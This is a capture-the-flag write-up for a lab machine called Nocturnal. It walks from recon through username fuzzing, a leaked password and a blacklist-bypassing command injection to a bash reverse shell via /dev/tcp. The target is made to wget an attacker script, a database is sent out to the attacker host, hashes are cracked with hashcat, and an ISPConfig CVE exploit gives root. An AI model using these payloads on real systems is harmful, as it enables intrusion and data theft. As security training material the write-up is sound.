```
sudo nmap -sC -sV -p- -vvv -Pn --min-rate 20000 --stats-every 50s 10.10.11.64
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-28 16:48 CDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 16:48
Completed Parallel DNS resolution of 1 host. at 16:48, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:48
Scanning 10.10.11.64 [65535 ports]
Discovered open port 80/tcp on 10.10.11.64
Discovered open port 22/tcp on 10.10.11.64
Increasing send delay for 10.10.11.64 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.64 from 5 to 10 due to 1643 out of 5475 dropped probes since last increase.
Increasing send delay for 10.10.11.64 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.64 from 20 to 40 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.11.64 from 40 to 80 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.11.64 from 80 to 160 due to max_successful_tryno increase to 8
Completed SYN Stealth Scan at 16:48, 5.65s elapsed (65535 total ports)
Initiating Service scan at 16:48
Scanning 2 services on 10.10.11.64
Completed Service scan at 16:48, 6.41s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.64.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 5.86s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 0.81s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 0.00s elapsed
Nmap scan report for 10.10.11.64
Host is up, received user-set (0.20s latency).
Scanned at 2025-04-28 16:48:20 CDT for 19s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDpf3JJv7Vr55+A/O4p/l+TRCtst7lttqsZHEA42U5Edkqx/Kb8c+F0A4wMCVOMqwyR/PaMdmzAomYGvNYhi3NelwIEqdKKnL+5svrsStqb9XjyShPD9SQK5Su7xBt+/TfJyJFRcsl7ZJdfc6xnNHQITvwa6uZhLsicycj0yf1Mwdzy9hsc8KRY2fhzARBaPUFdG0xte2MkaGXCBuI0tMHsqJpkeZ46MQJbH5oh4zqg2J8KW+m1suAC5toA9kaLgRis8p/wSiLYtsfYyLkOt2U+E+FZs4i3vhVxb9Sjl9QuuhKaGKQN2aKc8ItrK8dxpUbXfHr1Y48HtUejBj+AleMrUMBXQtjzWheSe/dKeZyq8EuCAzeEKdKs4C7ZJITVxEe8toy7jRmBrsDe4oYcQU2J76cvNZomU9VlRv/lkxO6+158WtxqHGTzvaGIZXijIWj62ZrgTS6IpdjP3Yx7KX6bCxpZQ3+jyYN1IdppOzDYRGMjhq5ybD4eI437q6CSL20=
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLcnMmaOpYYv5IoOYfwkaYqI9hP6MhgXCT9Cld1XLFLBhT+9SsJEpV6Ecv+d3A1mEOoFL4sbJlvrt2v5VoHcf4M=
|   256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIASsDOOb+I4J4vIK5Kz0oHmXjwRJMHNJjXKXKsW0z/dy
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:48
Completed NSE at 16:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.04 seconds
           Raw packets sent: 101651 (4.473MB) | Rcvd: 65822 (2.633MB)
```
We will see that there are two ports open with SSH and HTTP, HTTP redirects to nocturnal.htb which we will add into out hosts file 

On the website I see that it's a file upload application, the only things which we can really do is just register an account so we will just put in junk information 

To upload in our registered account, I will setup burp, make a file like .exe or something, capture the upload request and I see in the response it takes only these types of file extensions 
```
Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.
```
I will use any like xls, back to terminal I will make a .xls and see what that request looks like. 

Nothing really out of the ordinary, though when you hover your files, we will see that our name gets reflected in the URL. I will then click the file and capture request. 

I will use a username.txt file to try out different names which I might be able to find to impersonate someone else. I will use this wordlist 
https://gist.github.com/kivox/920c271ef8dec2b33c84e1f2cc2977fc

There are two ways in which I could so this whether it be to use ffuf or intruder. I chose both and see which ones were faster. 

I initially used intruder to fuzz for the names and then while I was waiting I setup a ffuf to also do the same thing and see whether or not it will be faster. This is the ffuf command I used in which I got four users 
```
ffuf -w ~/usernames.txt:FUZZ -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.xls' -H 'Cookie: PHPSESSID=p9iubjv3i42c3nvvo3frbnc59c' -fs 2985 -s
admin
amanda
andrew
tobias
```
From here within our request, we will put these names in instead of ours and see what we can get. Sending our requests with the names we found I see amanda has a `privacy.odt` file which I will download onto my own machine 

This is what we see 
```
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```
So now we have some credentials 
amanda:arHkG7HAI68X8s1J

I will now login to amandas account. We will see in amandas account that we have the option to go to an admin panel. In this panel we will see only PHP files and a password prompt. 

admin.php captures my eye 
```
<?php
session_start();

if (!isset($_SESSION['user_id']) || ($_SESSION['username'] !== 'admin' && $_SESSION['username'] !== 'amanda')) {
    header('Location: login.php');
    exit();
}

function sanitizeFilePath($filePath) {
    return basename($filePath); // Only gets the base name of the file
}

// List only PHP files in a directory
function listPhpFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    echo "<ul class='file-list'>";
    foreach ($files as $file) {
        $sanitizedFile = sanitizeFilePath($file);
        if (is_dir($dir . '/' . $sanitizedFile)) {
            // Recursively call to list files inside directories
            echo "<li class='folder'>📁 <strong>" . htmlspecialchars($sanitizedFile) . "</strong>";
            echo "<ul>";
            listPhpFiles($dir . '/' . $sanitizedFile);
            echo "</ul></li>";
        } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === 'php') {
            // Show only PHP files
            echo "<li class='file'>📄 <a href='admin.php?view=" . urlencode($sanitizedFile) . "'>" . htmlspecialchars($sanitizedFile) . "</a></li>";
        }
    }
    echo "</ul>";
}

// View the content of the PHP file if the 'view' option is passed
if (isset($_GET['view'])) {
    $file = sanitizeFilePath($_GET['view']);
    $filePath = __DIR__ . '/' . $file;
    if (file_exists($filePath) && pathinfo($filePath, PATHINFO_EXTENSION) === 'php') {
        $content = htmlspecialchars(file_get_contents($filePath));
    } else {
        $content = "File not found or invalid path.";
    }
}

function cleanEntry($entry) {
    $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];

    foreach ($blacklist_chars as $char) {
        if (strpos($entry, $char) !== false) {
            return false; // Malicious input detected
        }
    }

    return htmlspecialchars($entry, ENT_QUOTES, 'UTF-8');
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #1a1a1a;
            margin: 0;
            padding: 0;
            color: #ff8c00;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #2c2c2c;
            width: 90%;
            max-width: 1000px;
            padding: 30px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
            border-radius: 12px;
        }

        h1, h2 {
            color: #ff8c00;
            font-weight: 600;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 30px;
        }

        input[type="password"] {
            padding: 12px;
            font-size: 16px;
            border: 1px solid #555;
            border-radius: 8px;
            width: 100%;
            background-color: #333;
            color: #ff8c00;
        }

        button {
            padding: 12px;
            font-size: 16px;
            background-color: #2d72bc;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #245a9e;
        }

        .file-list {
            list-style: none;
            padding: 0;
        }

        .file-list li {
            background-color: #444;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 8px;
            display: flex;
            align-items: center;
        }

        .file-list li.folder {
            background-color: #3b3b3b;
        }

        .file-list li.file {
            background-color: #4d4d4d;
        }

        .file-list li a {
            color: #ff8c00;
            text-decoration: none;
            margin-left: 10px;
        }

        .file-list li a:hover {
            text-decoration: underline;
        }

        pre {
            background-color: #2d2d2d;
            color: #eee;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', Courier, monospace;
        }

        .message {
            padding: 15px;
            border-radius: 8px;
            margin-top: 15px;
            background-color: #e7f5e6;
            color: #2d7b40;
            font-weight: 500;
        }

        .error {
            background-color: #f8d7da;
            color: #842029;
        }

        .backup-output {
            margin-top: 20px;
            padding: 15px;
            border: 1px solid #555;
            border-radius: 8px;
            background-color: #333;
            color: #ff8c00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Admin Panel</h1>

        <h2>File Structure (PHP Files Only)</h2>
        <?php listPhpFiles(__DIR__); ?>

        <h2>View File Content</h2>
        <?php if (isset($content)) { ?>
            <pre><?php echo $content; ?></pre>
        <?php } ?>

        <h2>Create Backup</h2>
        <form method="POST">
            <label for="password">Enter Password to Protect Backup:</label>
            <input type="password" name="password" required placeholder="Enter backup password">
            <button type="submit" name="backup">Create Backup</button>
        </form>

        <div class="backup-output">

<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
    $password = cleanEntry($_POST['password']);
    $backupFile = "backups/backup_" . date('Y-m-d') . ".zip";

    if ($password === false) {
        echo "<div class='error-message'>Error: Try another password.</div>";
    } else {
        $logFile = '/tmp/backup_' . uniqid() . '.log';
       
        $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
        
        $descriptor_spec = [
            0 => ["pipe", "r"], // stdin
            1 => ["file", $logFile, "w"], // stdout
            2 => ["file", $logFile, "w"], // stderr
        ];

        $process = proc_open($command, $descriptor_spec, $pipes);
        if (is_resource($process)) {
            proc_close($process);
        }

        sleep(2);

        $logContents = file_get_contents($logFile);
        if (strpos($logContents, 'zip error') === false) {
            echo "<div class='backup-success'>";
            echo "<p>Backup created successfully.</p>";
            echo "<a href='" . htmlspecialchars($backupFile) . "' class='download-button' download>Download Backup</a>";
            echo "<h3>Output:</h3><pre>" . htmlspecialchars($logContents) . "</pre>";
            echo "</div>";
        } else {
            echo "<div class='error-message'>Error creating the backup.</div>";
        }

        unlink($logFile);
    }
}
?>

	</div>
        
        <?php if (isset($backupMessage)) { ?>
            <div class="message"><?php echo $backupMessage; ?></div>
        <?php } ?>
    </div>
</body>
</html>
```
In this code, the `cleanEntry()` function blacklists characters and spaces, the function will return false if any blacklisted character is found. 

We can use command injection and URL-encode our payload. 
I found that this request and command worked 
```
POST /admin.php HTTP/1.1
Host: nocturnal.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://nocturnal.htb/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://nocturnal.htb
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=m1gh646g6d01feq4idsb465hqh
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

password=%0a/bin/sh%09-c%09"whoami"%0a&backup=1
```
Output 
```
<SNIP>
sh: 3: backups/backup_2025-04-28.zip: not found
www-data
<SNIP>
```
Now we know that this web server is vulnerable we will get a rev shell, now I tried many times to just use one liners in the request but it got really complicated and untidy so I went over to chatgpt asking for some ideas and they said that I can upload a file and then execute it. This is what i did, so I firstly made a rev shell file called `shell` with these contents 
```
cat shell 
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```
I then setup a python server and then used wget in the command to download it onto the server 
```
password=%0a/bin/sh%09-c%09"wget%09<IP>:8000/shell%0a&backup=1
```
I then executed this script while having my netcat listener up
```
password=%0Abash%09-c%09"bash%09shell"%0A&backup=
```
Then we get a rev shell as user www-data. Looking around I see a nocturnal_database.db which I will download onto my machine 
```
#Local 
nc -lvnp 8001 > noctural_database.db
#Remote
cat nocturnal_database.db > /dev/tcp/10.10.14.25/8001
```
Now that we have the database. Within the database we have these hashes 
```
tobias:55c82b1ccd55ab219b3b109b07d5061d
amanda:df8b20aa0c935023f99ea58358fb63c4
admin:d725aeba143f575736b07e045d8ceebb
```
We can then use hashcat or john to crack these hashes. I used hashcat and we can see tobias password was cracked so now we have another set of credentials 
```
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse     
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Hash.Target......: hashes.txt
Time.Started.....: Mon Apr 28 18:20:39 2025 (3 secs)
Time.Estimated...: Mon Apr 28 18:20:42 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  5805.2 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]

Started: Mon Apr 28 18:20:34 2025
Stopped: Mon Apr 28 18:20:44 2025
```
We can now ssh into tobias and get flag
```
tobias@nocturnal:~$ cat user.txt
67b826e4f9db1f8c1d0833e6e7748607
```
Looking around in tobias ssh we dont see much, though when we look at processes he has running there is a website listening on port 8080 which I want to have a look at
```
tobias@nocturnal:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                
```
I will then forward this port 
```
ssh tobias@nocturnal.htb -L 6969:127.0.0.1:8080
```
Then head over to the website 
```
http://localhost:6969/login/
```
I see this is an ISPCONFIG instance, I then look at page source code to see if I can get a version and I do 
```
<SNIP>
<link rel='stylesheet' href='../themes/default/assets/stylesheets/ispconfig.css?ver=3.2' />
<SNIP>
```
Then I will research any vulnerabilities within this version and there is 
https://github.com/bipbopbup/CVE-2023-46818-python-exploit

We will glone this and then use it (we will also use password reuse) 
```
sudo git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit
Cloning into 'CVE-2023-46818-python-exploit'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 12 (delta 2), reused 1 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (12/12), 5.70 KiB | 5.70 MiB/s, done.
Resolving deltas: 100% (2/2), done.
┌─[au-vip-1]─[10.10.14.25]─[zzac@htb-jaqab7y7hj]─[~]
└──╼ [★]$ cd CVE-2023-46818-python-exploit/
┌─[au-vip-1]─[10.10.14.25]─[zzac@htb-jaqab7y7hj]─[~/CVE-2023-46818-python-exploit]
└──╼ [★]$ ls
exploit.py  README.md
┌─[au-vip-1]─[10.10.14.25]─[zzac@htb-jaqab7y7hj]─[~/CVE-2023-46818-python-exploit]
└──╼ [★]$ python3 exploit.py http://127.0.0.1:6969 admin slowmotionapocalypse
[+] Target URL: http://127.0.0.1:6969/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell# id
uid=0(root) gid=0(root) groups=0(root)


ispconfig-shell# cat /root/root.txt
c60190066c62d58ff3ed0975213d6b9d
```
